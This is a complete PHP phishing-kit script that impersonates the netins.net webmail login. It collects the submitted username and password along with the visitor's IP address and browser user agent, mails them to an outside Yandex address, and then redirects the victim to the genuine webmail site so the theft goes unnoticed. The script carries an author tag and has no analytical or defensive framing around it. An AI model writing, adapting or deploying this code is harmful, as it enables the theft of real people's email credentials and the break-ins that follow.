<?
$ip = getenv("REMOTE_ADDR");
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "-----------NET-Log--------------\n";
$message .= "_user: ".$_POST['_user']."\n";
$message .= "_pass: ".$_POST['_pass']."\n";
$message .= "IP: ".$ip."\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "-----------Done-By-Shalo1--------\n";
$send = "py.thonk@yandex.com";
$subject = "ReZulTs NETins";
$headers = "From: Netl0gs<bdtrophrecruiter@gmail.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message); 
header("Location:  https://webmail.netins.net/");

?>